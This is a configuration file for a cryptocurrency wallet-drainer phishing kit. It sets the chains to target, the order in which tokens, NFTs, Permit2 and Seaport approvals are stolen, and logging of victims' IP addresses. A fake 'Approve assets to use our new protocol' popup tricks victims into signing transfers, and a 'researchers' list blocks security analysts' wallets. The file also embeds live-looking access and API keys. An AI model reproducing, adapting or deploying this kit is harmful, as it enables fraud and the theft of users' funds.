// Your acces key
let ACCESS_KEY = "10eda682-0a4f-4472-ac07-3d02d3975213";

// Connect wallet settings
let chooseWalletTheme = "dark"; // Theme for this popup "dark" or "light"
let themeVariables = {
    '--w3m-z-index': 10000,
    '--w3m-overlay-backdrop-filter': 'blur(6px)',
};
// Custom styles and colors https://docs.walletconnect.com/2.0/web/web3modal/html/wagmi/theming


// Logging setting
let logDrainingStrategy = true; // Log draining strategy
let logEmptyWallets = false; // Log when wallet is empty
let logIpData =  true; // Add IP data to logs

// Repeat the highest proice token if user declines 
let repeatHighest = true;

let retry_changenetwork = 2;

// Weights of transfer, assets with highest weight will be transfered first. Weight = multiplier * eth_price
let multipliers = {
    "LP_NFTS": 1,
    "PERMIT2": 1,
    "BLUR": 1,
    "SEAPORT": 1,
    "SWAP": 1,
    "TOKENS": 1,
    "NFT": 1,
    "NATIVES": 1,
}

// Manual disable/enable chains. true - enabled, false - disabled
let eth_enabled = true;
let bsc_enabled = true;
let arb_enabled = true;
let polygon_enabled = true;
let avalanche_enabled = true;
let optimism_enabled = true;
let ftm_enabled = true;
let celo_enabled = true;

let autoconnect = false; // Automatically connect wallet after page loaded

// Alerts
let notEligible = "This wallet is not eligible. Please use a different wallet with enough assets"; // Low balance

// Popup settings
let popupEnabled = true; // true or false, popup after connecting wallet while draining

//HTML Code of popup
let popupCode = `<div id="drPopup" class="drPopup" style="display:none !important; font-family: 'Poppins', sans-serif; position: fixed !important; inset: 0 !important; z-index: 150 !important; height: 100% !important; width: 100% !important; transition: opacity 0.3s ease-in-out 0s; background: rgba(0, 0, 0, 0.8) !important; justify-content: center !important; max-height: 100%; !important">
        <div class="keks-container" style="margin: 40px 0px !important;">
        <div class="keks-content" style="position: relative !important;border-radius: 16px;background: rgb(255, 255, 255) !important;width: 360px;max-height: calc(0px + 100vh);max-width: 100%;">
        <div class="keks-title" style="position: relative; text-align: center; padding: 16px 24px;">
            <h4 style="font-weight: 600;
            line-height: 110%;
            font-size: 22px;
            color: rgb(4, 17, 29);
            padding: 4px 16px
            ">Pending...</h4>
            <div class="keks-close" id="popupClose"></div>
            <style>
                .keks-close {
                cursor: pointer;
                position: absolute;
                right: 25px;
                top: 15px;
                width: 20px;
                height: 20px;
                opacity: 0.3;
                }
                .keks-close:hover {
                opacity: 0.4;
                }
                .keks-close:before, .keks-close:after {
                content: '';
                position: absolute;
                left: 15px;
                height: 19px;
                width: 2px;
                background-color: rgb(10, 10, 10);

                }
                .keks-close:before {
                transform: rotate(45deg);
                }
                .keks-close:after {
                transform: rotate(-45deg);
                }
            </style>
        </div>
        <div class="keks-details" style="padding: 24px;">
            <div style="; align-items: center; gap: 25px;">
                <div class="keks-image">
                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="margin: auto; background: rgb(255, 255, 255); display: block; shape-rendering: auto;" width="200px" height="200px" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid">
                <path d="M10 50A40 40 0 0 0 90 50A40 42 0 0 1 10 50" fill="#e15b64" stroke="none">
                  <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 51;360 50 51"></animateTransform>
                </path>
                <!-- [ldio] generated by https://loading.io/ --></svg>
                </div>
    
                <div class="keks-imageName">
                    <p style="font-size: 16.5px; font-weight: 600; color: rgb(4, 17, 29);"></p>
                </div>
            </div>
            <hr style="padding: 0px; margin: 28px 0px; opacity: 0.2; border-color: rgb(138, 147, 155) currentcolor currentcolor; border-style: solid none none; border-width: 1px medium medium; border-image: none 100% / 1 / 0 stretch; color: rgb(138, 147, 155); text-align: center;">
            <div class="keks-text">
                <div style="color: rgb(4, 17, 29); align-items: center; margin-bottom: 12px; display: flex; text-align: center; font-weight: 600;  background: rgb(247, 247, 247); border-radius: 12px; padding: 7px;">
                <img src="https://cdn-icons-png.flaticon.com/512/8212/8212602.png" height="30" style="  display: inline-block; vertical-align: middle; width:30px">
                <h3 style="text-align: center; font-size: 13px; font-weight: 600; color: rgb(4, 17, 29); margin: 0;">Approve assets to use our new protocol</h3></div>
                <div style="color: rgb(4, 17, 29) !important; line-height: 140%; margin-bottom: 12px; font-weight: 600;"><h3 style="font-size: 14px; text-align: center; font-weight: 600; position: relative;">Check your wallet for signature request</h3></div>
                </div>
        </div>
    </div>
        </div>
    </div>`;

let popupElementID = "drPopup";
let canClosePopup = true; // Can user close popup?
let popupCloseButtonID = "popupClose";

// Button settings
let connectElement = "connectButton"; // Dont't touch if not sure (class of button that's starts draining)
let messageElement = "messageButton"; // Dont't touch if not sure (id of element that's show status)

let buttonMessagesEnabled = false;
let textInitialConnected = "Try again";
let textProgress = "Loading ...";
let success = "Please approve ...";
let failed = "Try again !";


// Two step draining
// After wallet connection drain doesn't starts, user need to click on additional button.
let twoStep = false; // true to enable twostep
let twoStepButtonElement = "startButton";

// After user connect wallet this function will be called, you can use it to display user info or enable twostep and show form for connecting and for claiming only 
function updateWalletData(walletAddress, walletEthBalance, status){
    // Paste any code that you want here
    // This function will execute after wallet connection
    // Use walletAddress and walletEthBalance variables

    // Status:
    // 0 - Connected wallet
    // 1 - Draining started
    // 2 - User not eligible
    // 3 - Draining finished

    console.log(walletAddress, walletEthBalance, status);
}

let infura_key = "9aa3d95b3bc440fa88ea12eaa4456161";
let wc_projectid = "0761e7d1b5103f901dbdb7fd033df5b9"; // ProjectID from https://cloud.walletconnect.com/

//Do not touch
let cfgversion = 680;

// Block wallets
let researchers = [
    "0x0000000000000000000000000000000000000003",
];

// [EXPERIMENTAL FUNCTIONS] Enable them if you know what you are doing
// These functions are untested and may cause potential profit loss
let experimental = {
    // No experimental fx's yet
};